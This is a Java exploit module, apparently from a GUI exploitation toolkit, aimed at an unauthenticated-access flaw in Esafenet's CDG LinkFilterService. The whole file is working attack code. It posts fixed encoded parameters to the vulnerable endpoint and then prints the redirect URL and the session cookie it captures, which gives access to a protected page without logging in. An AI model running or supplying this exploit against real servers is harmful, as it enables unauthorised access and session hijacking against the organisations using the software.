package exp.oa.esafenet;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class esafenet_LinkFilterService_unauth implements Exploitlnterface{

        @Override
        public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
            return att(url, textArea, textArea_cmd);
        }

        @Override
        public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
            Platform.runLater(() -> {
                textArea.appendText("\n 该漏洞为未授权访问，请访问url进行测试");
            });
            return null;
        }

        @Override
        public Boolean getshell(String url, TextArea textArea) {
            return null;
        }

        private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
            try {
                HashMap<String, String> head = new HashMap<>();
                head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
                head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                String postdata = "path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB";
                HttpURLConnection connection = HttpTools.getCoon(url+"/CDGServer3/LinkFilterService");
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                outputStream.write(postdata.getBytes());
                outputStream.close();
                String targeturl = connection.getHeaderField("Location");
                String cookies = connection.getHeaderField("Set-Cookie");
                connection.disconnect();
                if (connection.getResponseCode() == 302) {

                    Platform.runLater(() -> {
                        textArea.appendText("\n [ esafenet_LinkFilterService_unauth ]");
                        textArea.appendText("\n 未授权访问页面: "+targeturl);
                        textArea.appendText("\n cookie: "+cookies);
                        textArea.appendText("\n");
                    });

                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n");
                    });
                    return false;
                }

            } catch (Exception e) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 连接异常！！！");
                });
            }
            return false;
        }
}
